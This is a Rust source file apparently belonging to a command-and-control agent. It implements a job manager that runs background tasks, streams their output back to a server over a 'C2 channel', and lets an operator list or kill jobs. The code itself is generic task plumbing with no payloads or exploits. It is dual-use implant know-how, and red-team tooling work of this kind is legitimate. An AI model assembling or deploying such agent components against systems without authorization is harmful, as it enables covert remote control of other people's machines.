// src/agent/jobs.rs
//
// Background job system for the agent. Jobs run as tokio tasks and stream
// output chunks back to the server via the C2 channel. Each job gets a
// unique ID and can be listed, polled, or killed from the operator panel.

use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::mpsc;
use tokio::task::{JoinHandle, AbortHandle};
use serde::{Serialize, Deserialize};
use chrono::Utc;

use crate::common::CommandResponse;

// ── Types ──────────────────────────────────────────────────────────────

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq)]
pub enum JobStatus {
    Running,
    Completed,
    Failed,
    Killed,
}

#[derive(Clone, Debug, Serialize)]
pub struct JobInfo {
    pub id: u32,
    pub description: String,
    pub status: JobStatus,
    pub started_at: String,
    pub finished_at: Option<String>,
    /// Number of output chunks already delivered.
    pub chunks_sent: usize,
}

/// Internal bookkeeping (not serialized to operator).
struct JobEntry {
    info: JobInfo,
    abort: AbortHandle,
    /// Buffered output lines that haven't been sent yet.
    pending_output: Vec<String>,
    /// Final combined output (populated when the task finishes).
    final_output: Option<String>,
    final_error: Option<String>,
}

// ── Manager ────────────────────────────────────────────────────────────

pub struct JobManager {
    jobs: HashMap<u32, JobEntry>,
    next_id: u32,
    /// Cloned C2 sender – job tasks use this to push streamed results.
    c2_tx: mpsc::Sender<Vec<u8>>,
}

impl JobManager {
    pub fn new(c2_tx: mpsc::Sender<Vec<u8>>) -> Self {
        Self {
            jobs: HashMap::new(),
            next_id: 1,
            c2_tx,
        }
    }

    // ── spawn ──────────────────────────────────────────────────────────

    /// Spawn a background job. `work` is an async closure that receives
    /// a `JobOutputSink` and returns `(output, error, exit_code)`.
    pub fn spawn<F, Fut>(
        &mut self,
        description: String,
        req_id: u64,
        work: F,
    ) -> u32
    where
        F: FnOnce(JobOutputSink) -> Fut + Send + 'static,
        Fut: std::future::Future<Output = (String, String, i32)> + Send + 'static,
    {
        let job_id = self.next_id;
        self.next_id += 1;

        let tx = self.c2_tx.clone();
        let sink = JobOutputSink {
            job_id,
            req_id,
            tx: tx.clone(),
            chunk_count: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
        };

        let _chunk_counter = sink.chunk_count.clone();

        let handle: JoinHandle<(String, String, i32)> = tokio::spawn(async move {
            work(sink).await
        });

        let abort = handle.abort_handle();

        // Supervisor task: waits for the job to finish and sends the final
        // CommandResponse back to the server.
        let tx_final = tx.clone();
        tokio::spawn(async move {
            let result = handle.await;
            let (output, error, exit_code) = match result {
                Ok(r) => r,
                Err(e) if e.is_cancelled() => {
                    (format!("[Job {}] Killed by operator", job_id), String::new(), -1)
                }
                Err(e) => {
                    (String::new(), format!("[Job {}] Panicked: {}", job_id, e), -1)
                }
            };

            let resp = CommandResponse {
                request_id: req_id,
                output: format!("JOB_FINAL:{}|{}", job_id, output),
                error,
                exit_code,
            };
            if let Ok(data) = serde_json::to_vec(&resp) {
                let _ = tx_final.send(data).await;
            }
        });

        self.jobs.insert(job_id, JobEntry {
            info: JobInfo {
                id: job_id,
                description,
                status: JobStatus::Running,
                started_at: Utc::now().to_rfc3339(),
                finished_at: None,
                chunks_sent: 0,
            },
            abort,
            pending_output: Vec::new(),
            final_output: None,
            final_error: None,
        });

        job_id
    }

    // ── list ───────────────────────────────────────────────────────────

    pub fn list(&self) -> Vec<JobInfo> {
        self.jobs.values().map(|e| e.info.clone()).collect()
    }

    pub fn list_json(&self) -> String {
        serde_json::to_string_pretty(&self.list()).unwrap_or_else(|_| "[]".into())
    }

    // ── kill ───────────────────────────────────────────────────────────

    pub fn kill(&mut self, job_id: u32) -> String {
        if let Some(entry) = self.jobs.get_mut(&job_id) {
            if entry.info.status == JobStatus::Running {
                entry.abort.abort();
                entry.info.status = JobStatus::Killed;
                entry.info.finished_at = Some(Utc::now().to_rfc3339());
                format!("Job {} killed", job_id)
            } else {
                format!("Job {} is already {:?}", job_id, entry.info.status)
            }
        } else {
            format!("Job {} not found", job_id)
        }
    }

    // ── mark_finished (called by supervisor logic or process_response) ─

    pub fn mark_finished(&mut self, job_id: u32, output: &str, error: &str) {
        if let Some(entry) = self.jobs.get_mut(&job_id) {
            entry.info.status = if error.is_empty() {
                JobStatus::Completed
            } else {
                JobStatus::Failed
            };
            entry.info.finished_at = Some(Utc::now().to_rfc3339());
            entry.final_output = Some(output.to_string());
            entry.final_error = Some(error.to_string());
        }
    }

    // ── cleanup old jobs ──────────────────────────────────────────────

    pub fn purge_completed(&mut self) -> usize {
        let before = self.jobs.len();
        self.jobs.retain(|_, e| e.info.status == JobStatus::Running);
        before - self.jobs.len()
    }
}

// ── Sink (passed to job tasks for streaming output) ────────────────────

/// Handle given to job tasks so they can stream partial output back to the
/// server as they work. Each chunk is sent as a CommandResponse with a
/// special `JOB_STREAM:<id>|<data>` prefix so `process_response` can
/// display it in real-time.
#[derive(Clone)]
pub struct JobOutputSink {
    pub job_id: u32,
    pub req_id: u64,
    tx: mpsc::Sender<Vec<u8>>,
    chunk_count: Arc<std::sync::atomic::AtomicUsize>,
}

impl JobOutputSink {
    /// Send a partial output line. Non-blocking; drops silently if the
    /// channel is full or closed.
    pub async fn send_chunk(&self, line: &str) {
        self.chunk_count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let resp = CommandResponse {
            request_id: self.req_id,
            output: format!("JOB_STREAM:{}|{}", self.job_id, line),
            error: String::new(),
            exit_code: 0,
        };
        if let Ok(data) = serde_json::to_vec(&resp) {
            let _ = self.tx.send(data).await;
        }
    }

    /// Convenience: send multiple lines.
    pub async fn send_lines(&self, text: &str) {
        for line in text.lines() {
            self.send_chunk(line).await;
        }
    }
}
